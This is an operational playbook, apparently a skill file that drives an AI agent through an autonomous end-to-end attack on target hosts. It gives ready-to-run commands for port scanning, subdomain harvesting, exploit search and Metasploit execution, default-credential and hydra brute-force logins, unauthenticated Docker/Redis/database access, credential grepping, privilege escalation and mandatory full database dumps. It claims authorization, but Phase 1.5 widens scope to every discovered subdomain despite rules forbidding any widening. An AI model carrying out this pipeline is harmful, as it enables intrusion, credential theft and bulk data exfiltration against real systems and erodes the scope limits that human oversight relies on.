---
name: full-assault-mission
description: Autonomous end-to-end attack pipeline for an authorized mission with one or more targets - intake and scope lock, nmap host recon, web/API surface mapping, version-to-exploit matching, breach ladder (default creds, misconfig, CVE), privesc, database dump and evidence collection, final report. LOAD THIS FIRST when a mission hands you a target list, asks for a full or all-fronts attack, or you are the first worker on a fresh target - it sequences every other attack skill (web-recon, exploit-search, creds-initial-access, db-post-exploit) and gives copy-paste commands per phase.
---

SCOPE: authorized engagements only (owned / contracted targets). The mission's target list is the whole perimeter: never touch a host that is not on it, never widen. Follow the mission ROE at all times; steps marked [ROE: X] run only when the mission config explicitly says X=YES.

One pipeline, many targets. Work host by host, phase by phase. Every phase: RUN the commands, READ the output, apply the NEXT rule, move on. When told "load skill X", invoke the Skill tool with that name - it carries the deep methodology; this playbook carries the order and the exact commands. Do not improvise variants of commands that already work.

MISSION CONFIG (fail-closed): no explicit target list or no authorization statement in the mission → stop, report "mission config incomplete", do not scan. Budget: respect per-phase action caps below; when total budget hits 80%, stop attacking and switch to reporting (keep the 20% reserve).

---

## Phase 0 - Intake and workspace (≤5 actions)

```bash
mkdir -p work/evidence/{nmap,web,creds,loot,findings}
printf '%s\n' <target-1> <target-2> > work/targets.txt   # one host or URL per line, exactly the mission list
cat work/targets.txt | while read h; do getent hosts "$h" || echo "DNS-FAIL $h"; done
```

NEXT: for each host in targets.txt, run Phases 1-6 in order (finish one host before the next). A target that is a URL → take its hostname as the host; note the URL port for Phase 2.

## Phase 1 - Host recon: ports and services (≤25 actions per host)

Full TCP port sweep, then version detection on open ports, then a quick UDP look:

```bash
nmap -Pn -p- --min-rate 2000 -oA work/evidence/nmap/<host>-allports <host>
nmap -Pn -sV -sC -p <open-ports-comma-list> -oA work/evidence/nmap/<host>-versions <host>
nmap -Pn -sU --top-ports 50 -oA work/evidence/nmap/<host>-udp <host>   # cap at 10 min
```

No nmap in the sandbox → fallback TCP probe loop:

```bash
for p in 21 22 80 443 3306 3389 5432 6379 8080 8443 27017; do (echo > /dev/tcp/<host>/$p) 2>/dev/null && echo "OPEN $p"; done
```

READ the version table. NEXT rules:
- any http/https port → Phase 2 for that port.
- 5432/3306/6379/27017/9200 exposed → record for Phase 4 branch A.
- 2375 (Docker API), 10250 (kubelet), 11211 (memcached) → Phase 4 branch A immediately - these are footholds by misconfiguration.
- nothing open beyond ssh → Phase 4 branch C on ssh only, then done with the host.

## Phase 1.5 - Subdomain expansion (per apex domain; ≤10 actions per apex)

The mission scope covers an apex AND all its subdomains (platform suffix rule) — discovered subdomains are in-scope; register each live one so coverage and strict-scope track it:

```bash
curl -s -m 20 "https://crt.sh/?q=%.<apex>&output=json" | jq -r '.[].name_value' | sed 's/\*\.//' | sort -u | tee work/evidence/subdomains-<apex>.txt
```

crt.sh unreachable (egress-filtered) → probe the standard set instead:

```bash
for s in www api app dev test staging demo git gitlab ci jenkins admin panel vpn mail smtp ftp db mysql grafana kibana minio s3 cdn static assets media auth sso id portal beta old backup; do getent hosts "$s.<apex>" >/dev/null && echo "LIVE $s.<apex>"; done | tee work/evidence/subdomains-<apex>.txt
```

For each LIVE subdomain: call the `add_task_scope` tool (kind=subdomain, value=<sub>), append it to work/targets.txt, run Phases 1-2 on it. Cap: first 25 live subdomains per apex (list order); more only on mission request.

## Phase 2 - Web surface per HTTP(S) service (≤20 actions per port)

Load skill `web-recon` NOW and run its "Compact single-service probe playbook" against http(s)://<host>:<port>. Baseline first:

```bash
whatweb -v http://<host>:<port>/ | tee work/evidence/web/<port>-whatweb.txt
curl -sS -D - -o /dev/null http://<host>:<port>/ | tee work/evidence/web/<port>-headers.txt
```

JSON 404s, /swagger, /openapi.json, /api/* → ALSO load skill `api-assault`.
Admin/monitoring panel found (Grafana, Jenkins, phpMyAdmin, /admin) → ALSO load skill `admin-panel-abuse`.
Custom app with thin generic discovery → load skill `target-vocab-recon`: mine the bundle/markup vocabulary into work/vocab.txt and probe with differentials, not a fresh SecLists sweep.

NEXT: collect every "component + exact version" from headers, whatweb, swagger, login pages → Phase 3 list.

## Phase 3 - Fingerprint to exploit match (≤15 actions)

Load skill `exploit-search` NOW; its procedure is the recipe. Core loop per component:

```bash
searchsploit <service> <version> --exclude Denial
searchsploit -x <EDB-id>          # read the code BEFORE ever running it
nuclei -u http://<host>:<port> -tags cve -severity critical,high -c 8 -rl 20
msfconsole -q -x "search <service>; exit"   # note rank excellent/great module paths
```

GATE: applicability check before running anything (affected range, platform, auth required). Quote the advisory line that matches your fingerprint into the log. No version evidence → no CVE claim, record "version unknown" and move on.

NEXT: matched exploits → Phase 4 branch D. No matches → Phase 4 branches A-C.

## Phase 4 - Breach ladder (≤20 actions; branches in order, two failures per branch → next branch)

**Branch A - unauthenticated services:**
```bash
redis-cli -h <host> ping                 # PONG → CONFIG GET dir (writable = foothold, see creds-initial-access)
mongo --quiet --host <host> --eval 'db.adminCommand({listDatabases:1})'
curl -s http://<host>:2375/version       # Docker API open → root-equivalent foothold
mysql -h <host> -u root                  # root/no-password
```

**Branch B - default credentials** (load skill `creds-initial-access` for the full matrix): admin/admin, admin/password, grafana/admin:admin, postgres/postgres, root/root on every login surface found in Phase 2:
```bash
curl -s -X POST http://<host>:<port>/login -d 'username=admin&password=admin' -o - -w '\n%{http_code}\n'
```
A 302/200-with-session ≠ 401/401-equivalent → creds valid → record → Phase 5.

**Branch C - brute force** [ROE: CRED-REUSE] (skip silently if a login failure counter/lockout message appears):
```bash
hydra -L work/wordlists/users.txt -P work/wordlists/pass.txt -t 12 -f ssh://<host>
hydra -L work/wordlists/users.txt -P work/wordlists/pass.txt -t 12 -f http-post-form "/login:username=^USER^&password=^PASS^:F=failed"
```

**Branch D - run the matched exploit** (destructive variants allowed: payloads, service restarts, credential spraying; DoS-class modules excluded). OOB check (your listener / DNS canary) before any payload:
```bash
msfconsole -q -x "use <module-path>; set RHOSTS <host>; set RPORT <port>; set PAYLOAD <non-destructive>; run; exit"
```

Success = command execution OR a valid session/credential. Record HOW + proof, then Phase 5. All branches exhausted → record blockers, next host.

## The chain graph (load `exploit-chaining` on the FIRST confirmed primitive)

A primitive is a key, not a finding. Maintain `work/chain.md`: every confirmed node lists the edges it unlocks (panel → datasource/SSRF/exec, LFI → config → creds, SSRF → IMDS, creds → reuse/DB, JWT → admin). Always walk the top open edge (payoff rank − cost rank) before any new flat discovery or brute branch. Secrets harvested are new edge sources, never leaves. Only run Phase 4 branches A-C when the graph has no open edge above cost:med.

## Phase 5 - Foothold to root (≤15 actions)

Load skill `privesc-lateral-persistence` for the full checklists. Native quick pass on Linux:
```bash
sudo -n -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null | sort | head -30
cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null
grep -rE 'password|secret|token' /home /var/www /opt --include='*.env' --include='*.conf' -l 2>/dev/null | head
```
Windows: `whoami /priv`, `whoami /groups`, unquoted service paths, AlwaysInstallElevated.
Credential reuse into OTHER in-scope hosts is allowed (same mission list only) [ROE: CRED-REUSE].
Persistence/implants [ROE: PERSISTENCE] - skip unless mission says YES.

## Phase 6 - Data access and dump (≤10 actions)

Load skill `db-post-exploit` NOW: its per-engine read-only enumeration runs FIRST, dumps come after. With obtained creds:
```bash
psql "postgres://<user>:<pass>@<host>:5432/<db>" -c '\dt'
pg_dump "postgres://<user>:<pass>@<host>:5432/<db>" -t <table> > work/evidence/loot/<host>-<table>.sql
mysqldump --single-transaction -h <host> -u <user> -p<pass> <db> > work/evidence/loot/<host>-<db>.sql
```
Dumps are MANDATORY after enumeration: table-level first; escalate to a FULL dump by default when the estimated size is under 1 GB (or the full dump completes without load impact). Loot stays in work/evidence/loot (raw); reports carry masked copies only.

## Phase 7 - Findings (continuous; final pass ≤10 actions)

Load skill `finding-quality-reporting`. Every finding needs: command + output excerpt (proof), affected host:port, impact with a denominator, artifact path. Adversarial falsification pass: try to prove yourself wrong once per finding. A finding that arrived too easily (first-try login, instant admin) → load skill `opsec-decoy-detect` and check the honeypot signals before reporting impact.

## Phase 8 - Report and wrap (≤5 actions; mandatory at 80% budget)

Load skill `mission-distill` FIRST (bounded, ≤3 addenda from our own evidence → work/distill/), then skill `deliverable-engineering`; write work/report.md: per-host summary, findings by severity with proof excerpts (masked), loot inventory, blockers, untested surface, and the chain paths as the impact story. If a hard stop/timeout killed earlier runs → load skill `autonomy-budget-pacing` and reconstruct from artifacts per its recovery procedure.

## Decision rules

- Scope: only hosts in work/targets.txt; a discovered IP/hostname that is NOT on the list is out-of-scope - record it as recon data, never touch it.
- Two failed attempts on the same vector → write one line why, switch vector. Never loop a failing command.
- DoS-class anything is excluded (nmap scripts safe-category, searchsploit --exclude Denial, nuclei non-destructive templates). Exploit execution, credential spraying and full DB dumps are allowed by default; persistence only when the mission config says so.
- Budget pacing and incremental report mirroring follow skill `autonomy-budget-pacing` invariants.
- Per-host result is always one of: breached (how + loot), hardened-no-breach (what was tried), blocked (missing tool/access - say which).

## Rule

The mission ends with report.md written and every target accounted for - not when tokens run out.
